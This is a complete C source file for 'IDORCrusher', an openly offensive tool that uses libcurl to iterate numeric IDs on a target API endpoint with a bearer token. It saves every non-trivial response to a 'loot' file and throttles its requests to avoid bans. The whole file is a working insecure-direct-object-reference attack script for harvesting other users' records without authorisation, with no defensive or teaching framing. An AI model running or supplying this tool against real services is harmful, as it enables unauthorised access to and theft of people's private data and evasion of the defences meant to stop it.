#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <unistd.h>

#define MAX_BUF 8192

struct memory {
    char *response;
    size_t size;
};

static size_t write_cb(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct memory *mem = (struct memory *)userp;

    char *ptr = realloc(mem->response, mem->size + realsize + 1);
    if (!ptr) return 0;

    mem->response = ptr;
    memcpy(&(mem->response[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->response[mem->size] = 0;

    return realsize;
}

void banner() {
    printf(
    "██████╗ ██████╗  ██████╗ ██████╗ \n"
    "██╔══██╗██╔══██╗██╔═══██╗██╔══██╗\n"
    "██████╔╝██████╔╝██║   ██║██████╔╝\n"
    "██╔══██╗██╔══██╗██║   ██║██╔══██╗\n"
    "██████╔╝██║  ██║╚██████╔╝██║  ██║\n"
    "╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝\n"
    "IDORCrusher — Object-Level Authorization Abuse\n\n"
    );
}

int send_request(char *url, char *token, struct memory *mem) {
    CURL *curl;
    CURLcode res;
    struct curl_slist *headers = NULL;

    curl = curl_easy_init();
    if (!curl) return 0;

    headers = curl_slist_append(headers, "Content-Type: application/json");

    char auth[512];
    snprintf(auth, sizeof(auth), "Authorization: Bearer %s", token);
    headers = curl_slist_append(headers, auth);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, mem);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    res = curl_easy_perform(curl);

    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);

    return res == CURLE_OK;
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage:\n");
        printf("./idorcrusher <BASE_URL> <ENDPOINT> <TOKEN> <START_ID> <END_ID>\n\n");
        printf("Example:\n");
        printf("./idorcrusher https://api.target.com /api/user/ TOKEN123 1 500\n");
        return 1;
    }

    banner();

    char *base = argv[1];
    char *endpoint = argv[2];
    char *token = argv[3];
    int start = atoi(argv[4]);
    int end = atoi(argv[5]);

    curl_global_init(CURL_GLOBAL_ALL);

    FILE *out = fopen("idor_loot.txt", "w");
    if (!out) {
        perror("fopen");
        return 1;
    }

    for (int i = start; i <= end; i++) {
        char url[1024];
        snprintf(url, sizeof(url), "%s%s%d", base, endpoint, i);

        struct memory mem;
        mem.response = malloc(1);
        mem.size = 0;

        int ok = send_request(url, token, &mem);

        if (ok && mem.size > 50) {
            printf("[+] HIT ID %d (%zu bytes)\n", i, mem.size);
            fprintf(out, "ID %d:\n%s\n\n", i, mem.response);
        } else {
            printf("[-] ID %d\n", i);
        }

        free(mem.response);
        usleep(200000); // slow to avoid instant bans
    }

    fclose(out);
    curl_global_cleanup();

    printf("\n[+] Finished. Loot saved to idor_loot.txt\n");
    return 0;
}
